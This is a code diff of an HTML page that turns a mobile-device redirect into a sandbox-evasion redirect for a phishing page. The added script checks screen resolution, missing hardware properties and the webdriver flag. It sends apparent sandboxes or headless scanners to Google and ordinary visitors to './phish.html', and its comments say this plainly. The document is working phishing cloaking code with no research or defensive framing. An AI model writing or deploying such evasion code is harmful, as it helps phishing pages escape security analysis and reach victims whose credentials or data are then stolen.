@@ -3,20 +3,39 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Device Detection Demo</title>
+  <title>Device and Sandbox Detection Demo</title>
   <script>
-    // Simple function to detect mobile devices
-    function isMobileDevice() {
-      return /Mobi|Android|iPhone/i.test(navigator.userAgent);
+    // Detect if the environment might be a sandbox
+    function isSandbox() {
+      // Check for small screen resolution
+      if (window.screen.width < 1024 || window.screen.height < 768) {
+        console.log("Sandbox detected: Low resolution");
+        return true;
+      }
+
+      // Check for missing navigator properties
+      if (!navigator.hardwareConcurrency || !navigator.deviceMemory) {
+        console.log("Sandbox detected: Missing hardware properties");
+        return true;
+      }
+
+      // Check if browser is running in headless mode
+      const isHeadless = navigator.webdriver;
+      if (isHeadless) {
+        console.log("Sandbox detected: Headless browser");
+        return true;
+      }
+
+      return false;
     }
 
     window.onload = function () {
-      if (isMobileDevice()) {
-        // Redirect to phishing page if mobile
-        window.location.href = "./phish.html";
-      } else {
-        // Redirect to Google if not mobile
+      if (isSandbox()) {
+        // Redirect to Google if sandbox detected
         window.location.href = "https://www.google.com";
+      } else {
+        // Redirect to phishing page if not sandbox
+        window.location.href = "./phish.html";
       }
     };
   </script>
